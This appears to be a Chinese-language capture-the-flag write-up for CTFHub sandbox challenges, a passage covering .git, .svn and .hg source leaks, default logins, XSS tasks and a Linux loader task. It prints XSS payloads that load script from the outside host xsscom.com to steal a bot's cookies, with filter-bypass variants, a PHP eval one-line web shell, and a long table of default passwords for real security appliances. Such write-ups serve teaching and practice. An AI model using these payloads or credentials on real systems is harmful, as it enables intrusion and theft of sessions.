[*] Try to Clone with Directory Listing
[*] http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                 
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                           
提示：配置使用初始分支名，并消除这条警告，请执行：                         
提示：                                                                     
提示：  git config --global init.defaultBranch <名称>                      
提示：                                                                     
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development'。                                                                         
提示：可以通过以下命令重命名刚创建的分支：                                 
提示：                                                                     
提示：  git branch -m <name>                                               
                                                                           
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/05/4002c4fd9c95edfaa91ba505b6d1dd8f680b32
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/2c/1e32dfd33267f265fda913d29e29572c2ba0be
[*] objects/58/1bd5a9f51c3a1ba88014543f3c390c8542fde7
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/54/adac7f5e33aa6122e1c7b04e05cf2c03363c55
[*] objects/8b/1cb6b6cccaccbac8560385b1300c5494369a16
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git log                                             
commit 054002c4fd9c95edfaa91ba505b6d1dd8f680b32 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:55 2023 +0000

    remove flag

commit 2c1e32dfd33267f265fda913d29e29572c2ba0be
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000

    add flag

commit 54adac7f5e33aa6122e1c7b04e05cf2c03363c55
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git diff 2c1e32dfd33267f265fda913d29e29572c2ba0be
diff --git a/226282577915965.txt b/226282577915965.txt
deleted file mode 100644
index 8b1cb6b..0000000
--- a/226282577915965.txt
+++ /dev/null
@@ -1 +0,0 @@
-ctfhub{21b194cfff1432ef1c38d79c}

# git diff查看版本间更改，得到flag：ctfhub{21b194cfff1432ef1c38d79c}
# 此外还可以 git reset --hard

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git reset --hard 2c1e32dfd33267f265fda913d29e29572c2ba0be
HEAD 现在位于 2c1e32d add flag
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ ls
226282577915965.txt  50x.html  index.html
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ cat 226282577915965.txt                                     
ctfhub{21b194cfff1432ef1c38d79c}
```

提交`ctfhub{21b194cfff1432ef1c38d79c}`即可。

------

#### Stash

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

这题和上题的区别就在于：使用`git stash pop `恢复文件。

```bash
┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                             
 / ___(_) |_| | | | __ _  ___| | __                                         
| |  _| | __| |_| |/ _` |/ __| |/ /                                         
| |_| | | |_|  _  | (_| | (__|   <                                          
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                  
 A '.git' folder disclosure exploit.                                        
                                                                            
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/                                                                        
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-053bfbe9e957dbd0.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                   
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                              
提示：配置使用初始分支名，并消除这条警告，请执行：                          
提示：                                                                      
提示：  git config --global init.defaultBranch <名称>                       
提示：                                                                      
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development' 。                                                                          
提示：可以通过以下命令重命名刚创建的分支：                                  
提示：                                                                      
提示：  git branch -m <name>                                                
                                                                            
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/2a/f4c55fd7a6e64762c583aa9e751b4048797cce
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/da/610ebc4966063d73e2b6803ac14eb733d0fd13
[*] objects/76/393a7c85d8e8684f642345caf7dad19f000dfe
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/3d/7e73de132599e19f299844b23d115766c6bcc8
[*] objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Fetch Commit Objects
[*] objects/ea/8bccfc4d373b4ce4e69b9b038cae032aa27d71
[*] objects/7d/5628506a1cd9320aff8ee5ac48cbe9dadafc49
[*] objects/b6/2e1547700bda5aa20e86b97a5d554f413596df
[*] objects/80/705095c27dc16b00ae0469451f44a3bf78faf8
[*] Fetch Commit Objects End
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800 
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git log
commit 2af4c55fd7a6e64762c583aa9e751b4048797cce (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    remove flag

commit da610ebc4966063d73e2b6803ac14eb733d0fd13
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    add flag

commit 3d7e73de132599e19f299844b23d115766c6bcc8
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git diff da610ebc4966063d73e2b6803ac14eb733d0fd13
diff --git a/292222691319712.txt b/292222691319712.txt
deleted file mode 100644
index e358b09..0000000
--- a/292222691319712.txt
+++ /dev/null
@@ -1 +0,0 @@
-where is flag

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git stash pop                                    
冲突（修改/删除）：292222691319712.txt 在 Updated upstream 中被删除，在 Stashed changes 中被修改。292222691319712.txt 的 Stashed changes 版本在树中被保留。
位于分支 master
未合并的路径：
  （使用 "git restore --staged <文件>..." 以取消暂存）
  （酌情使用 "git add/rm <文件>..." 标记解决方案）
        由我们删除： 292222691319712.txt

修改尚未加入提交（使用 "git add" 和/或 "git commit -a"）
贮藏条目被保留以备您再次需要。
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ cat 292222691319712.txt                                    
ctfhub{7784261fb20081dfe2abe94a}
```

提交`ctfhub{7784261fb20081dfe2abe94a}`即可。

------

#### Index

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

同理。

```bash
┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                             
 / ___(_) |_| | | | __ _  ___| | __                                         
| |  _| | __| |_| |/ _` |/ __| |/ /                                         
| |_| | | |_|  _  | (_| | (__|   <                                          
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                  
 A '.git' folder disclosure exploit.                                        
                                                                            
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/                                                                        
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                   
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                              
提示：配置使用初始分支名，并消除这条警告，请执行：                          
提示：                                                                      
提示：  git config --global init.defaultBranch <名称>                       
提示：                                                                      
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development' 。                                                                          
提示：可以通过以下命令重命名刚创建的分支：                                  
提示：                                                                      
提示：  git branch -m <name>                                                
                                                                            
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/a2/77f03d557f6db4cb7b3ba18d1630a642165514
[*] objects/4d/ac90173ca05f0d4a8d2c9ce8327c4bb84869f3
[*] objects/7b/7e1784dc889629a748a96502b6d8b290f8f755
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/f7/0a136fe74a3578278b8b83a21f172f2a7b57c3
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ git log
commit a277f03d557f6db4cb7b3ba18d1630a642165514 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:35:08 2023 +0000

    add flag

commit 7b7e1784dc889629a748a96502b6d8b290f8f755
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:35:08 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ git diff a277f03d557f6db4cb7b3ba18d1630a642165514
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ ls
295351179921241.txt  50x.html  index.html
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ cat 295351179921241.txt                                    
ctfhub{db36e890d8ae9388e2d950c5}
```

提交`ctfhub{db36e890d8ae9388e2d950c5}`即可。

### SVN泄露

使用 [svnExploit](https://github.com/admintony/svnExploit) 未果。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/admintony/svnExploit.git

┌──(tyd㉿Kali)-[~/ctf]
└─$ cd svnExploit

┌──(tyd㉿Kali)-[~/ctf/svnExploit]
└─$ python SvnExploit.py -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
 ____             _____            _       _ _   
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_ 
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_ 
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|                 
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+--------------------+----------+------------------------------------------------+
|       文件名       | 文件类型 |                    CheckSum                    |
+--------------------+----------+------------------------------------------------+
|     index.html     |   file   | $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92 |
| flag_116206259.txt |   file   |                      None                      |
+--------------------+----------+------------------------------------------------+
```

换个工具 [dvcs-ripper](https://github.com/kost/dvcs-ripper) 试试。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/kost/dvcs-ripper.git 

┌──(tyd㉿Kali)-[~/ctf]
└─$ sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls
hg-decode.pl  README.md   rip-cvs.pl  rip-hg.pl
LICENSE       rip-bzr.pl  rip-git.pl  rip-svn.pl

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ./rip-svn.pl -v -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
[i] Found new SVN client storage format!
REP INFO => 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33   
[i] Trying to revert the tree, if you get error, upgrade your SVN client!   
已恢复“index.html”                                                          
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls
hg-decode.pl  LICENSE    rip-bzr.pl  rip-git.pl  rip-svn.pl
index.html    README.md  rip-cvs.pl  rip-hg.pl
                                                                         
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls -la                                  
总计 104
drwxr-xr-x 4 tyd tyd  4096  7月23日 18:03 .
drwxr-xr-x 6 tyd tyd  4096  7月23日 18:02 ..
drwxr-xr-x 8 tyd tyd  4096  7月23日 17:57 .git
-rw-r--r-- 1 tyd tyd   149  7月23日 17:57 .gitignore
-rw-r--r-- 1 tyd tyd  3855  7月23日 17:57 hg-decode.pl
-rw-r--r-- 1 tyd tyd   221  7月23日 18:03 index.html
-rw-r--r-- 1 tyd tyd 18027  7月23日 17:57 LICENSE
-rw-r--r-- 1 tyd tyd  5597  7月23日 17:57 README.md
-rwxr-xr-x 1 tyd tyd  6401  7月23日 17:57 rip-bzr.pl
-rwxr-xr-x 1 tyd tyd  4717  7月23日 17:57 rip-cvs.pl
-rwxr-xr-x 1 tyd tyd 15114  7月23日 17:57 rip-git.pl
-rwxr-xr-x 1 tyd tyd  6102  7月23日 17:57 rip-hg.pl
-rwxr-xr-x 1 tyd tyd  6157  7月23日 17:57 rip-svn.pl
drwxr-xr-x 5 tyd tyd  4096  7月23日 18:03 .svn

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ cd .svn   

# 用curl命令访问文件检查网页中是否存在flag返回404
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ curl http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/flag_116206259.txt
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ ls
entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ cd pristine
                                                                    
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
└─$ ls
88  bf                                                                         
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
└─$ cd 88      

┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
└─$ ls
88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
                                                                    
┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
└─$ cat 88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
ctfhub{e99d45499cf367688c931aa2}
```

提交`ctfhub{e99d45499cf367688c931aa2}`即可。

------

### HG泄露

```bash
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ./rip-hg.pl -u http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/.hg
[i] Getting correct 404 responses
[i] Finished (2 of 12)
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ tree .hg
.hg
├── 00changelog.i
├── dirstate
├── last-message.txt
├── requires
├── store
│   ├── 00changelog.i
│   ├── 00manifest.i
│   ├── data
│   ├── fncache
│   └── undo
├── undo.branch
├── undo.desc
└── undo.dirstate

3 directories, 11 files
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ cat .hg/last-message.txt                             
add flag                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ grep -a -r flag                                  
.git/hooks/fsmonitor-watchman.sample:           # return the fast "everything is dirty" flag to git and do the
�O��L▒c.!flag_11i206259.index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb7337normaldir()infinity��å~%���Á�root�$�8�@3▒
.svn/wc.db:�����2▒      flag_116206259.txt      index.html
index.html6259.txt
hg-decode.pl:      ( $head->{'flags'},
.hg/last-message.txt:add flag
.hg/dirstate:index.htmln��!d���flag_393953.txt
.hg/store/00manifest.i:Yf��������H�tw������m'�Ȉ�*x�-�1�@�>�@)-<�▒M������x�1<�v�Ǣ�2K){�Z3�s�&ӱf▒A����?6[�B�
                              6Ta�(��1$�Ü*YE������<W��ĩ���jV��⸉�8229flag_393953.txt7870e1473e78ed89644b65acab26c0f3e213f7a8
.hg/store/undo:data/flag_393953.txt.i0
.hg/store/fncache:data/flag_393953.txt.i
.hg/undo.dirstate:index.htmla��������flag_393953.txt
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_116206259.txt
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_393953.txt
ctfhub{f90b6c76f97124cd83e38e9b}
```

提交`ctfhub{f90b6c76f97124cd83e38e9b}`即可。

------

## 密码口令

### 默认口令

**常见网络安全设备弱口令(默认口令)**

| 设备                                  | 默认账号      | 默认密码                          |
| ------------------------------------- | ------------- | --------------------------------- |
| 深信服产品                            | sangfor       | sangfor sangfor@2018 sangfor@2019 |
| 深信服科技 AD                         |               | dlanrecover                       |
| 深信服负载均衡 AD 3.6                 | admin         | admin                             |
| 深信服WAC ( WNS V2.6)                 | admin         | admin                             |
| 深信服VPN                             | Admin         | Admin                             |
| 深信服ipsec-VPN (SSL 5.5)             | Admin         | Admin                             |
| 深信服AC6.0                           | admin         | admin                             |
| SANGFOR防火墙                         | admin         | sangfor                           |
| 深信服AF(NGAF V2.2)                   | admin         | sangfor                           |
| 深信服NGAF下一代应用防火墙(NGAF V4.3) | admin         | admin                             |
| 深信服AD3.9                           | admin         | admin                             |
| 深信服上网行为管理设备数据中心        | Admin         | 密码为空                          |
| SANGFOR_AD_v5.1                       | admin         | admin                             |
| 网御漏洞扫描系统                      | leadsec       | leadsec                           |
| 天阗入侵检测与管理系统 V7.0           | Admin         | venus70                           |
|                                       | Audit         | venus70                           |
|                                       | adm           | venus70                           |
| 天阗入侵检测与管理系统 V6.0           | Admin         | venus60                           |
|                                       | Audit         | venus60                           |
|                                       | adm           | venus60                           |
| 网御WAF集中控制中心(V3.0R5.0)         | admin         | leadsec.waf                       |
|                                       | audit         | leadsec.waf                       |
|                                       | adm           | leadsec.waf                       |
| 联想网御                              | administrator | administrator                     |
| 网御事件服务器                        | admin         | admin123                          |
| 联想网御防火墙PowerV                  | administrator | administrator                     |
| 联想网御入侵检测系统                  | lenovo        | default                           |
| 网络卫士入侵检测系统                  | admin         | talent                            |
| 网御入侵检测系统V3.2.72.0             | adm           | leadsec32                         |
|                                       | admin         | leadsec32                         |
| 联想网御入侵检测系统IDS               | root          | 111111                            |
|                                       | admin         | admin123                          |
| 科来网络回溯分析系统                  | csadmin       | colasoft                          |
| 中控考勤机web3.0                      | administrator | 123456                            |
| H3C iMC                               | admin         | admin                             |
| H3C SecPath系列                       | admin         | admin                             |
| H3C S5120-SI                          | test          | 123                               |
| H3C智能管理中心                       | admin         | admin                             |
| H3C ER3100                            | admin         | adminer3100                       |
| H3C ER3200                            | admin         | adminer3200                       |
| H3C ER3260                            | admin         | adminer3260                       |
| H3C                                   | admin         | adminer                           |
|                                       | admin         | admin                             |
|                                       | admin         | h3capadmin                        |
|                                       | h3c           | h3c                               |
| 360天擎                               | admin         | admin                             |
| 网神防火墙                            | firewall      | firewall                          |
| 天融信防火墙NGFW4000                  | superman      | talent                            |
| 黑盾防火墙                            | admin         | admin                             |
|                                       | rule          | abc123                            |
|                                       | audit         | abc123                            |
| 华为防火墙                            | telnetuser    | telnetpwd                         |
|                                       | ftpuser       | ftppwd                            |
| 方正防火墙                            | admin         | admin                             |
| 飞塔防火墙                            | admin         | 密码为空                          |
| Juniper_SSG__5防火墙                  | netscreen     | netscreen                         |
| 中新金盾硬件防火墙                    | admin         | 123                               |
| kill防火墙(冠群金辰)                  | admin         | sys123                            |
| 天清汉马USG防火墙                     | admin         | venus.fw                          |
|                                       | Audit         | venus.audit                       |
|                                       | useradmin     | venus.user                        |
| 阿姆瑞特防火墙                        | admin         | manager                           |
| 山石网科                              | hillstone     | hillstone                         |
| 绿盟安全审计系统                      | weboper       | weboper                           |
|                                       | webaudit      | webaudit                          |
|                                       | conadmin      | conadmin                          |
|                                       | admin         | admin                             |
|                                       | shell         | shell                             |
| 绿盟产品                              |               | nsfocus123                        |
| TopAudit日志审计系统                  | superman      | talent                            |
| LogBase日志管理综合审计系统           | admin         | safetybase                        |
| 网神SecFox运维安全管理与审计系统      | admin         | !1fw@2soc#3vpn                    |
| 天融信数据库审计系统                  | superman      | telent                            |
| Hillstone安全审计平台                 | hillstone     | hillstone                         |
| 网康日志中心                          | ns25000       | ns25000                           |
| 网络安全审计系统（中科新业）          | admin         | 123456                            |
| 天玥网络安全审计系统                  | Admin         | cyberaudit                        |
| 明御WEB应用防火墙                     | admin         | admin                             |
|                                       | admin         | adminadmin                        |
| 明御攻防实验室平台                    | root          | 123456                            |
| 明御安全网关                          | admin         | adminadmin                        |
| 明御运维审计与册风险控制系统          | admin         | 1q2w3e                            |
|                                       | system        | 1q2w3e4r                          |
|                                       | auditor       | 1q2w3e4r                          |
|                                       | operator      | 1q2w3e4r                          |
| 明御网站卫士                          | sysmanager    | sysmanager888                     |
| 亿邮邮件网关                          | eyouuser      | eyou_admin                        |
|                                       | eyougw        | admin@(eyou)                      |
|                                       | admin         | +-ccccc                           |
|                                       | admin         | cyouadmin                         |
| Websense邮件安全网关                  | administrator | admin                             |
| 梭子鱼邮件存储网关                    | admin         | admin                             |

打开这题靶机后发现是亿邮邮件网关，将默认口令一一尝试后，发现账户`eyougw`和密码`admin@(eyou)`能够登录成功。

> Hello CTFHub eyougw admin, ctfhub{8f55d6b3f8b427971ab9a45f}

提交`ctfhub{8f55d6b3f8b427971ab9a45f}`即可。

------

## XSS

### 反射型

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。

> #### What's your name 后的输入框填写 CTFHub 点击Submit
Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send

在接收到的内容中能看到`cookie : flag=ctfhub{c7f04cd9f2e9912994ba8f6b}`，提交即可。

------

### 存储型

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。

> #### What's your name 后的输入框填写 `</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Submit
Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send

在接收到的内容中能看到`cookie : flag=ctfhub{3815ce26ba81106c87aeafb2}`，提交即可。

------

### DOM反射

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。

> #### CHange text 后的输入框填写 `';</script></textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Submit
>
> #### Send URL to Bot中URL后的输入框填写`http://challenge-80649bd4ea91be99.sandbox.ctfhub.com:10800/?text=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send

在接收到的内容中能看到`cookie : flag=ctfhub{f9a1ed96d100cf595700f32d}`，提交即可。

------

### DOM跳转

进入网站，直接查看源代码，下面是关键代码，这里有`XSS`漏洞：

```html
<script>
    var target = location.search.split("=")
    if (target[0].slice(1) == "jumpto") 
        location.href = target[1];
    }
</script>
```

这段代码的作用是从当前页面的`URL`中通过`GET`方式获取查询字符串，如果参数名为`jumpto`，则将页面重定向到参数值所指定的`URL`。

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。

> #### JumpTo 后的输入框并不能填写内容
>
> #### Send URL to Bot中URL后的输入框填写`http://challenge-859ced9cb2ed32a5.sandbox.ctfhub.com:10800?jumpto=javascript:$.getScript("//xsscom.com//purFOq")` 点击Send

用`jQuery` 的 `$.getScript()` 函数来异步加载并执行来自 [xsscom](http://xsscom.com/) 的 `JavaScript` 脚本，通过`jumpto=javascript:$.getScript()`，在接收到的内容中能看到`cookie : flag=ctfhub{b9ae823a620388be4477a939}`，提交即可。

------

### 过滤空格

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。我们可以用`/`来代替空格，

> #### What's your name 后的输入框填写 `</textarea>'"><script/src=http://xsscom.com//purFOq></script>` 点击Submit
>
> #### Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script/src=http://xsscom.com//purFOq></script>` 点击Send

在接收到的内容中能看到`cookie : flag=ctfhub{1751e5e28f77d81afa0c962a}`，提交即可。

------

### 过滤关键词

利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。

发现关键词`script`被过滤了，我们可以通过以下俩种方式绕过关键词过滤：

- 双写绕过：

  ```html
  </textarea>'"><scrscriptipt src=http://xsscom.com//purFOq></scrscriptipt>
  ```

- 大小写绕过：

  ```html
  </textarea>'"><Script src=http://xsscom.com//purFOq></sCript>
  ```

在接收到的内容中能看到`cookie : flag=ctfhub{4b7f4238db209b657b3ff69f}`，提交即可。

------

### 动态加载器

打开靶机后看到以下页面：

> # CTFHub Linux 动态装载
>
> 当ELF没有 x 权限时, 如何执行?
>
> ```
> # chmod 755 /readflag
> # /readflag
> ctfhub{demoflag}
> #
> # chown root:root /readflag
> # chmod 644 /readflag
> # ls -l /readflag
> -rw-r--r-- 1 root root 8648 Mar  6 15:48 /readflag
> ```
>
> ## 目标: 执行 /readflag 读取 flag
>
> 出题人: 本题不需要提权, 这是给你的 [WebShell](http://challenge-4311b12ebeb97331.sandbox.ctfhub.com:10800/ant.php), 只能帮你到这了。

靶机给出了`ant.php`，源码如下：

```php
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

